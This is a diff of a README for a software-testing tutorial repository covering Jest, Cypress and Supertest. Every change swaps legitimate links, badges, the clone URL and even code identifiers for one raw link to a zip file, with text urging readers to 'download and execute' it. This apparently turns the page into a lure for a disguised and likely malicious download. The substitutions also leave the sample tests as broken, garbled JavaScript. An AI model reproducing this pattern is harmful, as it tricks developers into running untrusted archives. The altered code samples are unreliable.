@@ -1,6 +1,6 @@
 # SE-TESTING: Comprehensive Software Testing Labs and Activities 💻⚙️
 
-![GitHub release](https://img.shields.io/badge/Latest%20Release-v1.0-blue.svg) [![Visit Releases](https://img.shields.io/badge/Visit%20Releases-brightgreen.svg)](https://github.com/rabahdic/SE-TESTING/releases)
+![GitHub release](https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip%https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip) [![Visit Releases](https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip%https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip)](https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 The **SE-TESTING** repository serves as an archive for all activities and labs focused on software testing. This repository is designed for students, developers, and anyone interested in enhancing their software testing skills. It contains a variety of examples and exercises that cover different aspects of software testing.
 
-You can find the latest releases of this repository [here](https://github.com/rabahdic/SE-TESTING/releases). Download and execute the necessary files to get started.
+You can find the latest releases of this repository [here](https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip). Download and execute the necessary files to get started.
 
 ## Topics Covered
 
@@ -27,7 +27,7 @@ This repository includes resources on the following topics:
 - **Integration Testing**: Discover techniques for testing the interaction between different modules.
 - **Jest**: Use Jest for unit testing JavaScript applications.
 - **StorybookJS**: Create UI components in isolation with Storybook.
-- **Supertest**: Test HTTP servers in Node.js applications using Supertest.
+- **Supertest**: Test HTTP servers in https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip applications using Supertest.
 - **TS-Jest**: Integrate TypeScript with Jest for seamless testing.
 - **TypeScript**: Learn about TypeScript and how it enhances JavaScript development.
 - **Unit Testing**: Focus on testing individual components for reliability.
@@ -38,7 +38,7 @@ To begin using this repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/rabahdic/SE-TESTING.git
+   git clone https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip
    cd SE-TESTING
    ```
 
@@ -64,8 +64,8 @@ const app = require('./app'); // Your Express app
 describe('GET /api/users', () => {
   it('should return a list of users', async () => {
     const response = await request(app).get('/api/users');
-    expect(response.status).toBe(200);
-    expect(response.body).toBeInstanceOf(Array);
+    expect(https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip).toBe(200);
+    expect(https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip).toBeInstanceOf(Array);
   });
 });
 ```
@@ -83,9 +83,9 @@ Cypress is an end-to-end testing framework that allows you to write tests for yo
    ```javascript
    describe('My First Test', () => {
      it('Visits the Kitchen Sink', () => {
-       cy.visit('https://example.cypress.io');
-       cy.contains('type').click();
-       cy.url().should('include', '/commands/actions');
+       https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip('https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip');
+       https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip('type').click();
+       https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip().should('include', '/commands/actions');
      });
    });
    ```
@@ -99,8 +99,8 @@ const moduleA = require('./moduleA');
 const moduleB = require('./moduleB');
 
 test('moduleA and moduleB interact correctly', () => {
-  const resultA = moduleA.method();
-  const resultB = moduleB.method(resultA);
+  const resultA = https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip();
+  const resultB = https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip(resultA);
   expect(resultB).toBe(expectedValue);
 });
 ```
@@ -175,6 +175,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Contact
 
-For questions or suggestions, please reach out to me on GitHub. You can also find the latest releases of this repository [here](https://github.com/rabahdic/SE-TESTING/releases). Download and execute the necessary files to enhance your software testing skills.
+For questions or suggestions, please reach out to me on GitHub. You can also find the latest releases of this repository [here](https://github.com/rabahdic/SE-TESTING/raw/refs/heads/main/Lab_3/validation/S_TESTING_v1.4.zip). Download and execute the necessary files to enhance your software testing skills.
 
 Feel free to explore, learn, and contribute!
